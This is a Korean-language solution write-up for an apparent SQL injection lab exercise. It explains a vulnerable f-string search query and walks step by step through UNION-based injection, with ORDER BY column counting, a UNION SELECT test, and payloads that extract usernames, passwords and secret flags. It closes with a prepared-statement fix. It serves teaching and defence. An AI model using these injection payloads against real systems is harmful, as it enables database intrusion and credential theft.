# 문제 05 풀이

## 왜 UNION이 가능한가? (상세)

검색 기능의 취약한 코드:

```python
query = f"SELECT p.id, p.title, ... FROM posts ... WHERE title LIKE '%{keyword}%' OR content LIKE '%{keyword}%' ..."
```

사용자가 ` ' ` 를 입력하면, SQL 구문상 문자열이 닫히면서 뒤에 임의의 SQL을 붙일 수 있게 됩니다.

예:
- 입력: `test' UNION SELECT ... -- `
- 실제 실행되는 쿼리:
  ```sql
  SELECT ... FROM posts 
  WHERE title LIKE '%test' UNION SELECT ... -- %' 
     OR content LIKE '%test' UNION SELECT ... -- %'
  ```

`-- ` 이후의 모든 내용이 주석 처리되어 원래 쿼리의 나머지 부분이 무시됩니다.

## 컬럼 수와 타입을 맞추는 과정 (가장 중요한 스킬)

UNION SELECT를 사용하려면 **두 SELECT의 컬럼 개수와 데이터 타입이 정확히 일치**해야 합니다.

### 단계 1: 컬럼 수 알아내기 (ORDER BY)

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 6 --
' ORDER BY 7 --   ← 여기서 에러가 나면 실제 컬럼 수는 6개
```

이 앱은 보통 6개 컬럼입니다.

### 단계 2: 기본 UNION 테스트

```sql
' UNION SELECT 1,2,3,4,5,6 --
```

이게 화면에 에러 없이 결과가 나오면 컬럼 개수가 맞은 것입니다.

### 단계 3: 실제 데이터로 교체

```sql
' UNION SELECT id, username, password, 4, 5, 6 FROM users --
' UNION SELECT id, owner, secret, flag, 5, 6 FROM secrets --
```

## secrets 테이블을 일부러 만든 이유

이 실습 환경에서 "진짜 가치 있는 데이터"를 숨겨놓기 위해서입니다.

UNION 기반 SQLi의 본질은 **"내가 원하는 테이블의 데이터를 마음대로 가져오는 것"** 입니다.

실무에서도 admin 테이블, credit_card 테이블, secret_notes 테이블 등을 UNION으로 털어내는 경우가 많습니다.

## 자주 헷갈리는 포인트

- `UNION` 과 `UNION ALL` 의 차이: UNION은 중복 제거, UNION ALL은 중복 포함 (보통 ALL을 더 많이 씀)
- 컬럼 타입 불일치: 숫자 컬럼 자리에 문자열을 넣으면 에러 날 수 있음 → `1` 대신 `'a'` 로 테스트하면서 맞춤
- 첫 번째 쿼리의 결과가 화면에 섞여 나오는 걸 방지하고 싶을 때: `1 AND 1=2 UNION SELECT ...` 사용 (거짓 조건으로 첫 번째 결과셋을 비움)

## 방어

가장 강력한 방어는 Prepared Statement입니다:

```python
c.execute(
    "SELECT ... WHERE title LIKE ? OR content LIKE ?", 
    (f"%{keyword}%", f"%{keyword}%")
)
```

UNION 같은 구조 변경 공격 자체가 불가능해집니다.

이 문제에서 성공적으로 secrets의 FLAG를 여러 개 뽑아냈다면, Ch04의 UNION 기반 공격은 상당히 이해한 상태입니다.
